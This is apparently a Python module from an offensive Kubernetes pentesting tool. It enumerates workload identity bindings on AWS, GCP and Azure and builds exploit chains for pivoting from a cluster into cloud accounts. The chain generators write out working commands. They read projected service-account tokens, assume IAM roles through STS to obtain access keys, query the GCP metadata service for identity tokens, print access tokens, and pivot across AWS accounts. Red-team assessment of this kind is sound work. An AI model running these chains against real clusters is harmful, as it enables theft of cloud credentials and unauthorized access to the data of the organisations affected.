"""Workload identity abuse: K8s → cloud credential pivoting.

Enumerate and exploit K8s → cloud identity bindings:
- AWS IRSA (IAM Roles for Service Accounts)
- GCP Workload Identity
- Azure Pod Identity / OIDC Federation
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from kubexhunt.core.graph import RelationType
from kubexhunt.exploit.chain_generator import ExploitChain, ExploitFramework, ExploitStep


@dataclass
class IRSABinding:
    """AWS IRSA binding: SA → IAM role."""

    service_account: str
    namespace: str
    iam_role_arn: str
    iam_role_name: str
    iam_role_policies: list[str] = field(default_factory=list)
    token_projection_path: str = "/var/run/secrets/eks.amazonaws.com/serviceaccount/token"
    token_audience: str = "sts.amazonaws.com"
    is_overprivileged: bool = False
    detected_via: str = "annotation"  # annotation, serviceaccount-spec

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "service_account": self.service_account,
            "namespace": self.namespace,
            "iam_role_arn": self.iam_role_arn,
            "iam_role_name": self.iam_role_name,
            "iam_role_policies": self.iam_role_policies,
            "token_projection_path": self.token_projection_path,
            "token_audience": self.token_audience,
            "is_overprivileged": self.is_overprivileged,
        }


@dataclass
class GCPWIBinding:
    """GCP Workload Identity binding: SA → GCP service account."""

    kubernetes_sa: str
    kubernetes_namespace: str
    gcp_service_account: str
    gcp_project: str
    gcp_roles: list[str] = field(default_factory=list)
    identity_pool: str = ""
    provider_id: str = ""
    is_overprivileged: bool = False

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "kubernetes_sa": self.kubernetes_sa,
            "kubernetes_namespace": self.kubernetes_namespace,
            "gcp_service_account": self.gcp_service_account,
            "gcp_project": self.gcp_project,
            "gcp_roles": self.gcp_roles,
            "identity_pool": self.identity_pool,
            "provider_id": self.provider_id,
            "is_overprivileged": self.is_overprivileged,
        }


@dataclass
class AzureWIBinding:
    """Azure workload identity binding: SA → managed identity or federated cred."""

    kubernetes_sa: str
    kubernetes_namespace: str
    azure_client_id: str
    azure_tenant_id: str
    azure_subscription_id: str
    federation_issuer: str
    federation_subject: str
    roles: list[str] = field(default_factory=list)
    binding_type: str = "federated"  # federated or pod-identity

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "kubernetes_sa": self.kubernetes_sa,
            "kubernetes_namespace": self.kubernetes_namespace,
            "azure_client_id": self.azure_client_id,
            "azure_tenant_id": self.azure_tenant_id,
            "azure_subscription_id": self.azure_subscription_id,
            "federation_issuer": self.federation_issuer,
            "federation_subject": self.federation_subject,
            "roles": self.roles,
            "binding_type": self.binding_type,
        }


class WorkloadIdentityAbuser:
    """Enumerate and exploit workload identity bindings."""

    def enumerate_irsa_bindings(self) -> list[IRSABinding]:
        """Enumerate AWS IRSA bindings in cluster.

        Returns:
            List of detected IRSA bindings
        """
        bindings = []

        # In real implementation, would:
        # 1. kubectl get sa -A -o json | jq '.items[] | select(.metadata.annotations."eks.amazonaws.com/role-arn")'
        # 2. For each SA, parse the ARN and check attached policies

        # Mocked example
        bindings.append(
            IRSABinding(
                service_account="app-sa",
                namespace="production",
                iam_role_arn="arn:aws:iam::123456789012:role/eks-app-role",
                iam_role_name="eks-app-role",
                iam_role_policies=[
                    "AmazonS3FullAccess",  # Overprivileged
                    "AmazonRDSFullAccess",
                ],
                is_overprivileged=True,
                detected_via="annotation",
            )
        )

        bindings.append(
            IRSABinding(
                service_account="logging-sa",
                namespace="logging",
                iam_role_arn="arn:aws:iam::123456789012:role/eks-logging-role",
                iam_role_name="eks-logging-role",
                iam_role_policies=["CloudWatchAgentServerPolicy"],
                is_overprivileged=False,
            )
        )

        return bindings

    def enumerate_gcp_wi_bindings(self) -> list[GCPWIBinding]:
        """Enumerate GCP Workload Identity bindings.

        Returns:
            List of detected GCP WI bindings
        """
        bindings = []

        # In real implementation, would:
        # 1. kubectl get sa -A -o json | jq '.items[] | select(.metadata.annotations."iam.gke.io/gcp-service-account")'
        # 2. gcloud iam service-accounts get-iam-policy to check roles

        bindings.append(
            GCPWIBinding(
                kubernetes_sa="workload-sa",
                kubernetes_namespace="default",
                gcp_service_account="workload-sa@project-id.iam.gserviceaccount.com",
                gcp_project="project-id",
                gcp_roles=["roles/storage.admin", "roles/bigquery.admin"],
                is_overprivileged=True,
            )
        )

        return bindings

    def enumerate_azure_wi_bindings(self) -> list[AzureWIBinding]:
        """Enumerate Azure workload identity bindings.

        Returns:
            List of detected Azure WI bindings
        """
        bindings = []

        # In real implementation, would:
        # 1. kubectl get sa -A -o json | jq '.items[] | select(.metadata.annotations."azure.workload.identity/client-id")'
        # 2. az identity show to check roles

        bindings.append(
            AzureWIBinding(
                kubernetes_sa="app-identity",
                kubernetes_namespace="default",
                azure_client_id="12345678-1234-1234-1234-123456789012",
                azure_tenant_id="87654321-4321-4321-4321-210987654321",
                azure_subscription_id="subid-1234-5678-9012",
                federation_issuer="https://kubernetes.default.svc.cluster.local",
                federation_subject="system:serviceaccount:default:app-identity",
                roles=["Owner", "Contributor"],  # Overprivileged
                binding_type="federated",
            )
        )

        return bindings

    def find_overprivileged_bindings(
        self,
        irsa_bindings: list[IRSABinding] | None = None,
        gcp_bindings: list[GCPWIBinding] | None = None,
        azure_bindings: list[AzureWIBinding] | None = None,
    ) -> list[tuple[str, str]]:
        """Find overprivileged workload identity bindings.

        Args:
            irsa_bindings: Optional list of IRSA bindings
            gcp_bindings: Optional list of GCP WI bindings
            azure_bindings: Optional list of Azure bindings

        Returns:
            List of (binding_id, severity) tuples for overprivileged bindings
        """
        overprivileged = []

        if irsa_bindings is None:
            irsa_bindings = self.enumerate_irsa_bindings()
        if gcp_bindings is None:
            gcp_bindings = self.enumerate_gcp_wi_bindings()
        if azure_bindings is None:
            azure_bindings = self.enumerate_azure_wi_bindings()

        for binding in irsa_bindings:
            if binding.is_overprivileged:
                overprivileged.append((f"irsa:{binding.service_account}:{binding.namespace}", "HIGH"))

        for gcp_binding in gcp_bindings:
            if gcp_binding.is_overprivileged:
                overprivileged.append(
                    (f"gcp-wi:{gcp_binding.kubernetes_sa}:{gcp_binding.kubernetes_namespace}", "HIGH")
                )

        for azure_binding in azure_bindings:
            # Azure "Owner" role is critical
            if "Owner" in azure_binding.roles:
                overprivileged.append(
                    (f"azure-wi:{azure_binding.kubernetes_sa}:{azure_binding.kubernetes_namespace}", "CRITICAL")
                )

        return overprivileged

    def generate_irsa_abuse_chain(self, binding: IRSABinding) -> ExploitChain:
        """Generate IRSA abuse chain: SA → IAM role → AWS resources.

        Args:
            binding: IRSA binding to exploit

        Returns:
            ExploitChain with IRSA abuse steps
        """
        steps = []

        # Step 1: Get token from pod
        steps.append(
            ExploitStep(
                step_number=1,
                relation=RelationType.BOUND_TO_CLOUD_IDENTITY,
                from_node=f"sa:{binding.namespace}:{binding.service_account}",
                to_node="irsa_token",
                framework=ExploitFramework.BASH,
                command=f"cat {binding.token_projection_path}",
                description="Extract IRSA token from service account",
                mitre_techniques=["T1552.001"],  # Unsecured Credentials
            )
        )

        # Step 2: Assume IAM role via STS
        steps.append(
            ExploitStep(
                step_number=2,
                relation=RelationType.CAN_ASSUME_CLOUD_ROLE,
                from_node="irsa_token",
                to_node=f"iam_role:{binding.iam_role_name}",
                framework=ExploitFramework.BASH,
                command=f"""
export AWS_ROLE_ARN={binding.iam_role_arn}
export AWS_WEB_IDENTITY_TOKEN_FILE={binding.token_projection_path}
export AWS_STS_REGIONAL_ENDPOINTS=regional

aws sts assume-role-with-web-identity \\
  --role-arn $AWS_ROLE_ARN \\
  --role-session-name eks-exploit \\
  --web-identity-token $(cat $AWS_WEB_IDENTITY_TOKEN_FILE) \\
  --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \\
  --output text
""",
                description="Assume AWS IAM role via STS",
                mitre_techniques=["T1550.001"],  # Use Alternate Authentication Material
            )
        )

        # Step 3: Access AWS resources
        steps.append(
            ExploitStep(
                step_number=3,
                relation=RelationType.CAN_ACCESS_CLOUD_RESOURCE,
                from_node=f"iam_role:{binding.iam_role_name}",
                to_node="aws_resources",
                framework=ExploitFramework.BASH,
                command="aws s3 ls && aws rds describe-db-instances",
                description="Enumerate and access AWS resources",
                mitre_techniques=["T1526"],  # Cloud Service Discovery
            )
        )

        chain = ExploitChain(
            path_id=f"IRSA-{binding.namespace}-{binding.service_account}",
            nodes=[
                f"sa:{binding.namespace}:{binding.service_account}",
                "irsa_token",
                binding.iam_role_arn,
                "aws_resources",
            ],
            steps=steps,
            title=f"IRSA Abuse: {binding.service_account} → {binding.iam_role_name}",
            description="Exploit IRSA binding to assume role and access AWS resources",
            complexity="EASY",
            estimated_time_minutes=3,
            requires_network=True,
            requires_node_access=False,
        )

        return chain

    def generate_gcp_wi_abuse_chain(self, binding: GCPWIBinding) -> ExploitChain:
        """Generate GCP Workload Identity abuse chain.

        Args:
            binding: GCP WI binding to exploit

        Returns:
            ExploitChain with GCP WI abuse steps
        """
        steps = []

        # Step 1: Get GCP identity token
        steps.append(
            ExploitStep(
                step_number=1,
                relation=RelationType.BOUND_TO_CLOUD_IDENTITY,
                from_node=f"sa:{binding.kubernetes_namespace}:{binding.kubernetes_sa}",
                to_node="gcp_token",
                framework=ExploitFramework.BASH,
                command=f"""
curl -s -H "Metadata-Flavor: Google" \\
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience={binding.gcp_service_account}" \\
  -H "X-goog-iam-authority-selector: request-header" \\
  -H "X-goog-iam-authorization-token: IDENTITY_TOKEN"
""",
                description="Get GCP identity token via metadata service",
                mitre_techniques=["T1552.001"],
            )
        )

        # Step 2: Impersonate GCP service account
        steps.append(
            ExploitStep(
                step_number=2,
                relation=RelationType.CAN_ASSUME_CLOUD_ROLE,
                from_node="gcp_token",
                to_node=f"gcp_sa:{binding.gcp_service_account}",
                framework=ExploitFramework.BASH,
                command="gcloud auth application-default print-access-token",
                description="Impersonate GCP service account",
                mitre_techniques=["T1550.001"],
            )
        )

        chain = ExploitChain(
            path_id=f"GCP-WI-{binding.kubernetes_namespace}-{binding.kubernetes_sa}",
            nodes=[
                f"sa:{binding.kubernetes_namespace}:{binding.kubernetes_sa}",
                "gcp_token",
                binding.gcp_service_account,
            ],
            steps=steps,
            title=f"GCP WI Abuse: {binding.kubernetes_sa} → {binding.gcp_service_account}",
            description="Exploit GCP Workload Identity to impersonate service account",
            complexity="EASY",
            estimated_time_minutes=3,
        )

        return chain

    def generate_cross_account_chains(self, irsa_bindings: list[IRSABinding] | None = None) -> list[ExploitChain]:
        """Generate cross-account AWS escalation chains.

        Args:
            irsa_bindings: Optional list of IRSA bindings

        Returns:
            List of ExploitChain for cross-account access
        """
        chains = []

        if irsa_bindings is None:
            irsa_bindings = self.enumerate_irsa_bindings()

        # For each binding, check if it can assume cross-account roles
        for binding in irsa_bindings:
            if "sts:AssumeRole" in binding.iam_role_policies or any("Full" in p for p in binding.iam_role_policies):
                # Can potentially assume other roles
                chain = ExploitChain(
                    path_id=f"XACCT-{binding.iam_role_name}",
                    nodes=[
                        f"sa:{binding.namespace}:{binding.service_account}",
                        binding.iam_role_arn,
                        "cross_account_role",
                    ],
                    steps=[
                        ExploitStep(
                            step_number=1,
                            relation=RelationType.CAN_ASSUME_CLOUD_ROLE,
                            from_node=binding.iam_role_arn,
                            to_node="cross_account_role",
                            framework=ExploitFramework.BASH,
                            command="""
aws sts assume-role \\
  --role-arn arn:aws:iam::OTHER_ACCOUNT:role/TARGET_ROLE \\
  --role-session-name cross-account-pivot
""",
                            description="Assume cross-account IAM role",
                            mitre_techniques=["T1550.001"],
                        )
                    ],
                    title=f"Cross-Account Pivot via {binding.iam_role_name}",
                    description="Pivot to another AWS account via role assumption",
                    complexity="MEDIUM",
                )

                chains.append(chain)

        return chains
